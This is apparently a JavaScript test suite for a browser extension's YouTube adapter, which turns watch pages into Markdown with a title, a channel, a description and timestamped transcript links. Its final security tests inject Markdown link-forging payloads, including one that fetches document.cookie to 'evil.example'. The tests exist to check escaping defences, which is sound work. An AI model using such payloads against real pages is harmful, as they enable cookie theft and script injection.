// YouTube adapter (CLIP-10).
//
// The whole point is the transcript: the generic pipeline saves a player
// shell, and what the page is *about* is in a side panel it scores as
// furniture. Fixture is a trimmed real watch page — see fixtures/youtube.html.

import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { loadExtensionScripts } from "../test_helpers.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const fixture = (name) => readFileSync(join(HERE, "fixtures", name), "utf8");

const g = loadExtensionScripts([
  "domlite.js",
  "markdown.js",
  "adapters/util.js",
  "adapters/registry.js",
  "adapters/youtube.js",
]);

const WATCH = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

function run(url, html) {
  return g.MonoAdapters.run({ url, tree: g.MonoDomLite.parse(html), baseUrl: url, title: "t" });
}

test("it claims watch, shorts and youtu.be URLs and nothing else", () => {
  const [yt] = g.MonoAdapters.all().filter((a) => a.name === "youtube");
  const claims = (url) => yt.match({ url });

  assert.ok(claims(WATCH));
  assert.ok(claims("https://m.youtube.com/watch?v=abc"));
  assert.ok(claims("https://youtu.be/dQw4w9WgXcQ"));
  assert.ok(claims("https://www.youtube.com/shorts/abc123"));
  assert.equal(claims("https://www.youtube.com/"), false, "the home feed is not a video");
  assert.equal(claims("https://www.youtube.com/@coastalarchive"), false);
  assert.equal(claims("https://notyoutube.test/watch?v=x"), false);
});

test("title, channel, description and a timestamped transcript", () => {
  const out = run(WATCH, fixture("youtube.html"));

  assert.equal(out.adapter, "youtube");
  assert.equal(out.title, "How a lighthouse keeper's ledger survived");
  assert.match(out.markdown, /^# How a lighthouse keeper's ledger survived/);
  assert.match(out.markdown, /\*\*Channel:\*\* \[Coastal Archive\]\(https:\/\/www\.youtube\.com\/@coastalarchive\)/);
  assert.match(out.markdown, /Forty years of weather, wrecks and rowboats/);

  assert.match(out.markdown, /## Transcript/);
  // Each line is a deep link, so a quote in a note jumps back to the second.
  assert.match(out.markdown, /\[0:00\]\(https:\/\/www\.youtube\.com\/watch\?v=dQw4w9WgXcQ&t=0s\) The drawer was painted shut/);
  assert.match(out.markdown, /\[0:14\]\(\S+&t=14s\) Eleven wrecks between 1931 and 1971\./);
  // h:mm:ss has to survive, or an hour-long talk links every line to itself.
  assert.match(out.markdown, /\[1:02:30\]\(\S+&t=3750s\) And that is where the ledger ends\./);

  assert.equal(out.meta.adapter, "youtube");
  assert.equal(out.meta.videoId, "dQw4w9WgXcQ");
  assert.equal(out.meta.channel, "Coastal Archive");
  assert.equal(out.meta.transcriptSegments, 3);
});

test("the recommendation rail never leaks into the capture", () => {
  const out = run(WATCH, fixture("youtube.html"));
  assert.doesNotMatch(out.markdown, /A completely different video/);
});

test("no transcript panel is a warning, not a failure", () => {
  const html = fixture("youtube.html").replace(
    /<ytd-engagement-panel-section-list-renderer[\s\S]*?<\/ytd-engagement-panel-section-list-renderer>/,
    ""
  );
  const out = run(WATCH, html);

  assert.equal(out.adapter, "youtube");
  assert.match(out.markdown, /# How a lighthouse keeper's ledger survived/);
  assert.doesNotMatch(out.markdown, /## Transcript/);
  assert.ok(
    out.warnings.some((w) => /transcript/i.test(w)),
    `expected a transcript warning, got ${JSON.stringify(out.warnings)}`
  );
  assert.equal(out.meta.transcriptSegments, 0);
});

test("a watch page stripped of every known hook falls back to the generic pipeline", () => {
  // What a YouTube redesign looks like from here: the URL still matches, and
  // nothing else does. Degrading must cost the adapter, not the capture.
  const out = run(WATCH, "<html><head><title>YouTube</title></head><body><div id=player></div></body></html>");
  assert.equal(out, null);
  assert.ok(g.MonoAdapters.lastWarnings().some((w) => /youtube declined/.test(w)));
});

test("a bare og:title is still enough to beat the player shell", () => {
  const html = `<html><head>
    <meta property="og:title" content="A talk with no transcript">
    <meta property="og:description" content="Slides are in the description.">
    </head><body></body></html>`;
  const out = run(WATCH, html);

  assert.equal(out.adapter, "youtube");
  assert.match(out.markdown, /# A talk with no transcript/);
  assert.match(out.markdown, /Slides are in the description\./);
});

test("a video id out of the URL cannot become part of a link target", () => {
  // watchUrl is built from ?v= and is then the target of every transcript
  // deep link, so an id carrying Markdown punctuation writes those links.
  const [yt] = g.MonoAdapters.all().filter((a) => a.name === "youtube");
  for (const hostile of ["x)](javascript:alert(1))", "abc def", "a/b", "x#y"]) {
    const url = `https://www.youtube.com/watch?v=${encodeURIComponent(hostile)}`;
    assert.equal(yt.match({ url }), false, `${JSON.stringify(hostile)} is not a video id`);
    assert.equal(run(url, fixture("youtube.html")), null, "so the generic pipeline gets the page");
  }

  // And the shape it does accept is still every shape YouTube really uses.
  assert.ok(yt.match({ url: WATCH }));
  assert.ok(yt.match({ url: "https://www.youtube.com/shorts/abc123" }));
  assert.ok(yt.match({ url: "https://youtu.be/dQw4w9WgXcQ" }));
});

test("markdown syntax in a channel name or a transcript line cannot forge a link", () => {
  const html = fixture("youtube.html")
    .replace(">Coastal Archive<", ">Coastal](javascript:fetch('//evil.example/'+document.cookie)) Archive<")
    .replace("The drawer was painted shut", "The drawer](javascript:alert(2)) was painted shut");
  const out = run(WATCH, html);

  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
});

test("a channel href cannot close its own link target", () => {
  // The href is made absolute, so the scheme is safe — but an unescaped ")"
  // ends the (...) early and whatever follows becomes Markdown.
  const html = fixture("youtube.html").replace(
    'href="/@coastalarchive"',
    `href="/@coastalarchive)](javascript:fetch('//evil.example/'+document.cookie))"`
  );
  const out = run(WATCH, html);
  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
});
